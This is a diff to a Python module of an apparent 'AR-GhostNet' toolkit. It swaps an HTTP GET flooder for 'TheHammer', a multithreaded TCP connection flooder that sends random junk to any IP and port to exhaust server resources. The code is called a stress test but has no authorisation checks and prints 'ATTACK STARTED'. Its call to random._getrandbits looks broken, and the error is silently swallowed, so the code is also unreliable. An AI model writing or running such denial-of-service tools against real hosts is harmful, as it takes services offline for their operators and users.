@@ -1,69 +1,74 @@
-# AR-GhostNet | Stress Testing Engine (The Hammer)
-# Location: modules/stresser/stresser.py
-
-import requests
+import socket
 import threading
-from utils.colors import Colors
-from config.settings import Settings
+import random
+import sys
 
-class Stresser:
-    def __init__(self):
-        self.timeout = Settings.DEFAULT_TIMEOUT
-        self.active = False
-        self.request_count = 0
+class TheHammer:
+    def __init__(self, target_ip, target_port=80):
+        self.target_ip = target_ip
+        self.target_port = target_port
+        self.running = False
+        self.attack_count = 0
 
-    def attack(self, url):
-        while self.active:
+    def attack_socket(self):
+        """
+        Creates a continuous stream of TCP connections to exhaust server resources.
+        """
+        while self.running:
             try:
-                # Sending a simple GET request to stress the server
-                requests.get(url, timeout=self.timeout)
-                self.request_count += 1
-                if self.request_count % 100 == 0:
-                    print(f"{Colors.YELLOW}[*] Requests sent: {self.request_count}...{Colors.RESET}")
-            except requests.exceptions.RequestException:
-                # We ignore connection errors because the server might be slowing down
+                # Create a TCP socket
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(2) # Short timeout to rotate connections faster
+                s.connect((self.target_ip, self.target_port))
+                
+                # Send a junk payload to keep the connection open/busy
+                payload = random._getrandbits(1024) # Generate random junk data
+                s.send(str.encode(str(payload))) 
+                
+                self.attack_count += 1
+                s.close()
+            except socket.error:
+                # Port might be closed or server is already crashing
+                pass
+            except Exception:
                 pass
 
-    def start(self):
-        print(f"{Colors.CYAN}--- THE HAMMER: Stress Testing Engine ---{Colors.RESET}")
-        target_url = input(f"{Colors.GREEN}Enter Target URL (e.g. http://example.com): {Colors.RESET}")
+    def run(self, thread_count=100):
+        """
+        Launches the stress test with a specified number of threads.
+        """
+        print(f"\n[!] THE HAMMER: INITIALIZING RESOURCE STRESS TEST")
+        print(f"[*] Target IP: {self.target_ip} | Port: {self.target_port}")
+        print(f"[*] Thread Count: {thread_count}")
+        print("-" * 60)
         
-        if not target_url.startswith("http"):
-            print(f"{Colors.RED}[!] Error: URL must start with http:// or https://{Colors.RESET}")
-            return
+        self.running = True
+        threads = []
 
-        thread_count = input(f"{Colors.GREEN}Enter Number of Threads (e.g. 100): {Colors.RESET}")
-        
+        # Launching the hammer
         try:
-            threads_num = int(thread_count)
-        except ValueError:
-            print(f"{Colors.RED}[!] Invalid number. Using default 50.{Colors.RESET}")
-            threads_num = 50
-
-        print(f"{Colors.RED}[!] Starting the Hammer... Target: {target_url}{Colors.RESET}")
-        self.active = True
-        
-        threads_list = []
-        for i in range(threads_num):
-            t = threading.Thread(target=self.attack, args=(target_url,))
-            t.start()
-            threads_list.append(t)
-
-        print(f"{Colors.GREEN}[+] Attack launched with {threads_num} threads. Press Ctrl+C to stop.{Colors.RESET}")
-        
-        try:
-            # Keep the main thread alive while others are attacking
-            while True:
-                pass
+            for i in range(thread_count):
+                t = threading.Thread(target=self.attack_socket)
+                t.daemon = True # Ensure threads close when main program exits
+                threads.append(t)
+                t.start()
+            
+            print("[+] ATTACK STARTED... Press Ctrl+C to stop the Hammer.")
+            
+            while self.running:
+                # Print current attack stats every second
+                # Note: attack_count is shared across threads, so it grows rapidly
+                print(f"\r[+] Packets/Connections Sent: {self.attack_count}", end="")
+                # Use a small sleep to prevent the print loop from hogging CPU
+                import time
+                time.sleep(1)
+                
         except KeyboardInterrupt:
-            self.active = False
-            print(f"\n{Colors.YELLOW}[*] Stopping The Hammer... Total requests sent: {self.request_count}{Colors.RESET}")
+            self.running = False
+            print("\n" + "-" * 60)
+            print(f"[+] HAMMER STOPPED. Total connections attempted: {self.attack_count}")
+            print("-" * 60)
 
-    # --- Added for main.py compatibility ---
-    def launch(self, target):
-        self.start()
-
-# For standalone testing
-if __name__ == "__main__":
-    hammer = Stresser()
-    hammer.start()
+# Example for testing:
+# hammer = TheHammer("127.0.0.1", 80)
+# hammer.run(thread_count=500)
